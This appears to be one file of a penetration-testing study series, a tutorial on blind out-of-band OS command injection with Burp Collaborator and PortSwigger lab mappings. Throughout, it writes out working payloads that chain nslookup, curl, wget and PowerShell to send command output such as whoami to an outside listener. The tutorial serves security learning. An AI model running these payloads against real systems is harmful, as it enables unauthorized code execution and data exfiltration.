# Out-of-Band (OOB) Command Injection

## 1. When You Need OOB Techniques

Out-of-band command injection becomes necessary when:
- There is no reflected output (blind), **and**
- Timing signals are unreliable or unavailable — e.g., the vulnerable code path runs asynchronously in a background job queue, behind a message broker, with no correlation back to your original HTTP request's response time.

In this scenario, the only way to confirm execution — or extract data — is to make the **target server itself reach out** to infrastructure you control, over DNS or HTTP. This is conceptually identical to OOB techniques in blind SQL injection (e.g., DNS exfiltration via `xp_dirtree` or similar), but here the channel is opened directly by an OS-level command rather than a database function.

## 2. Setting Up a Listener — Burp Collaborator

PortSwigger Burp Suite's **Collaborator** feature generates a unique, disposable subdomain (e.g., `a1b2c3d4e5f6.oastify.com`) and a corresponding listener that logs every DNS lookup and every HTTP/HTTPS request that hits it, along with the full request details and source IP.

**Workflow:**
1. Open Burp Suite → Burp Collaborator client (or use the auto-generated payloads in Burp Repeater/Intruder if using the Pro version with built-in Collaborator integration).
2. Generate a new Collaborator payload — this gives you a unique hostname.
3. Embed that hostname inside your command injection payload (see below).
4. Send the request to the target.
5. Poll the Collaborator client (or wait for automatic polling) to see if any DNS or HTTP interactions were logged from the target server.

If a DNS lookup or HTTP request appears in Collaborator originating from the target infrastructure, this is **conclusive proof of remote code execution**, independent of any response timing or content.

## 3. DNS Exfiltration — Linux

### Payload: `; nslookup attacker-collab-id.oastify.com`

Full injected value: `8.8.8.8; nslookup x1y2z3.oastify.com`

**Breakdown:**
- `;` — unconditional chaining, as established in prior files.
- `nslookup` — a standard DNS query utility present on virtually every Linux distribution (and Windows too, in its own `cmd.exe`-compatible form — see Section 5). It resolves the given hostname, which means the server's resolver **must perform a DNS lookup** against that hostname's authoritative nameserver to get an answer.
- `x1y2z3.oastify.com` — the unique Collaborator-generated subdomain. Because this domain's authoritative nameserver is Burp Collaborator's own infrastructure, the DNS query is routed there and logged, confirming the target server resolved it — meaning your command executed.

**Why DNS specifically is valuable:** DNS resolution typically isn't blocked by restrictive outbound firewall rules the way arbitrary HTTP/HTTPS egress often is — many hardened production networks allow only DNS (port 53) outbound, plus a small allowlist of HTTP destinations. This makes DNS-based OOB the more reliable channel when HTTP-based exfiltration fails due to network egress controls.

### Exfiltrating Command Output via DNS (Data Smuggling)

Once you've confirmed basic OOB works, you can encode actual command output into the subdomain itself:

Payload: `` ; nslookup $(whoami).x1y2z3.oastify.com ``

**Breakdown:**
- `$(whoami)` — command substitution, executed first by the shell; its output (e.g., `www-data`) is substituted as literal text into the surrounding string before the overall command runs.
- The resulting hostname becomes, for example, `www-data.x1y2z3.oastify.com`.
- `nslookup` then resolves this constructed hostname, meaning the DNS query that arrives at Collaborator's logs **contains your exfiltrated data as the subdomain label** — visible directly in the Collaborator interaction log without needing any response from the target at all.

**Practical limitation:** DNS labels have strict length and character restrictions (each label max 63 characters, alphanumeric plus hyphen only, no spaces or most special characters). This works cleanly for short outputs like a username, but for longer or binary data you typically need to base32/base64-encode the output first and potentially split it across multiple DNS queries — this is exactly the kind of automation `commix` handles for you (see `06_Commix_Automation.md`).

## 4. HTTP Exfiltration — Linux

### Payload: `; curl http://x1y2z3.oastify.com/`

**Breakdown:**
- `curl` — a command-line HTTP client present on most modern Linux systems (and frequently pre-installed in containers/cloud images).
- `http://x1y2z3.oastify.com/` — the Collaborator-generated URL; when `curl` makes this request, it appears in Collaborator's HTTP interaction log, including the full request (headers, etc.), giving slightly richer logging than a bare DNS lookup.

### Payload with data exfiltration: `; curl http://x1y2z3.oastify.com/$(whoami)`

**Breakdown:**
- `$(whoami)` substitutes the command output directly into the URL path before `curl` sends the request — so Collaborator logs an HTTP request to `/www-data`, revealing the exfiltrated value in the request path. HTTP paths have far more permissive character/length limits than DNS labels, making this preferable for exfiltrating larger amounts of data when HTTP egress is actually permitted from the target network.

### Fallback if `curl` Is Unavailable: `wget`

Payload: `; wget http://x1y2z3.oastify.com/`

**Breakdown:**
- `wget` is an alternative HTTP client; functionally similar for this purpose. Useful to try if `curl` is filtered, removed, or simply not installed on a minimal container image — having both in your payload toolkit avoids a false "not vulnerable" conclusion due to a missing utility rather than an actual lack of injection.

## 5. DNS/HTTP Exfiltration — Windows

### Payload (cmd.exe): `& nslookup x1y2z3.oastify.com`

**Breakdown:**
- Identical concept to Linux — `nslookup` ships natively with Windows and behaves the same way for triggering a DNS lookup against your Collaborator subdomain.
- `&` — Windows command separator, as established in earlier files.

### Payload (cmd.exe) with PowerShell-based HTTP exfiltration:

```
& powershell -Command "Invoke-WebRequest -Uri http://x1y2z3.oastify.com/$(whoami)"
```

**Breakdown:**
- `powershell -Command "..."` — invokes PowerShell from within `cmd.exe` and passes a one-line script as the `-Command` argument; useful because `cmd.exe` itself has no native HTTP client.
- `Invoke-WebRequest` — PowerShell's built-in HTTP client cmdlet, roughly equivalent to `curl`.
- `-Uri http://x1y2z3.oastify.com/$(whoami)` — specifies the target URL; the `$(whoami)` subexpression is evaluated by PowerShell (not `cmd.exe`) before the request is sent, substituting the current username into the path, exactly like the Linux `curl` example.

## 6. PortSwigger Lab Mapping (Academy Progression Order)

| Order | Lab Name | What It Teaches | Relevant Technique From This File |
|---|---|---|---|
| 4 | **Blind OS command injection with out-of-band interaction** | Fully blind injection point with no reliable timing signal; you must use Burp Collaborator to confirm execution via DNS. | Section 3 — basic `nslookup <collaborator-id>` confirmation is sufficient to solve this lab. |
| 5 | **Blind OS command injection with out-of-band data exfiltration** | Same blind scenario, but the lab requires you to actually retrieve a specific piece of data (commonly the output of `whoami`) via the OOB channel, not just confirm interaction occurred. | Section 3's data-smuggling technique — `` nslookup $(whoami).<collaborator-id> `` — read the exfiltrated value directly from the Collaborator interaction log. |

## 7. Real-World Notes

- In real engagements, OOB techniques are often the **only viable confirmation method** for injection points inside asynchronous job processors, message queue consumers, webhook handlers, or scheduled/cron-triggered scripts — none of which return a meaningful HTTP response tied to your payload's execution.
- Always check **egress filtering** assumptions explicitly in your report — if DNS-based OOB worked but HTTP-based OOB did not, that's a meaningful finding about the target's network architecture worth mentioning, since it affects what an actual attacker could exfiltrate in a real compromise (DNS-only exfil is much lower bandwidth than HTTP).
- Self-hosting your own OOB listener (e.g., using `interactsh` or a custom DNS server you control) is standard practice when Burp Collaborator's default public infrastructure is blocked or monitored by the target's security team, or for engagements where using a third-party SaaS Collaborator server isn't permitted by client policy.

## 8. Common Mistakes

- Forgetting to poll/refresh the Collaborator client after sending the payload — interactions can take a few seconds to register, especially for DNS recursion through multiple resolvers.
- Using a payload that depends on a tool (`curl`, `nslookup`) not actually installed on the minimal/hardened target system, and concluding "not vulnerable" rather than trying an alternative utility.
- Not accounting for DNS label character restrictions when attempting to exfiltrate data containing spaces, slashes, or other special characters without first encoding it — the query may simply fail to resolve, producing a false negative on a real positive.

## 9. Report-Writing Notes

- Include a **screenshot of the Burp Collaborator interaction log** showing the timestamp, originating IP (which should match the target server's known IP/infrastructure), and the full DNS or HTTP interaction — this is considered very strong, hard-to-dispute evidence for client reports.
- Explicitly state whether DNS-only or full HTTP egress was achieved, since this materially affects the realistic data-exfiltration impact you should describe in the risk/impact section.

---
**Previous file:** `03_Blind_Command_Injection.md`
**Next file:** `05_Filter_WAF_Bypass.md`
